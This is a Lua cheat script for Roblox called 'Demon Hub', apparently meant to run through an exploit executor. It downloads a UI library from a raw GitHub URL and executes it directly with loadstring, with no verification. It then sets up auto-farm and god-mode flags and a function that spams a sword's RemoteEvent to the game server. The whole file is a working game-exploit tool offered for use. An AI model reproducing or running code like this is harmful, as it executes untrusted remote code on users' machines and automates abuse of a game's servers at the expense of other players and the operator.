-- Demon Hub 2025 - Final Script with Corrected Slider Values --

-- Safely load the UI library
local success, library = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Consistt/Ui/main/UnLeaked"))()
end)

if not success or not library then
    warn("Demon Hub Error: The UI Library failed to load. Please check your internet connection or the script's source link. The script cannot continue.")
    return -- Stop the script if the library did not load
end

-- Play initial sound
local function playSound(id, vol)
    local s = Instance.new("Sound")
    s.SoundId, s.Volume, s.Parent = id, vol or 5, game:GetService("SoundService")
    s:Play()
    game:GetService("Debris"):AddItem(s, s.TimeLength + 1)
end
playSound("rbxassetid://570433034", 10)

-- Global Variables & Core Functions
_G.farm = false
_G.active = false
_G.fastFarmConnection = nil
_G.permaGodActive = false
local range = 40

local function fireSword(times)
    local player = game.Players.LocalPlayer
    if not player or not player.Character then return end
    local character = player.Character or player.CharacterAdded:Wait()
    local sword = character:FindFirstChild("sword") or player.Backpack:FindFirstChild("sword")
    if sword then
        local handle = sword:FindFirstChild("Handle")
        local up = handle and handle:FindFirstChild("up")
        local remoteEvent = up and up:FindFirstChild("RemoteEvent")
        if remoteEvent then
            for i = 1, times do
                remoteEvent:FireServer()
                task.wait(0.05)
            end
        end
    end
end

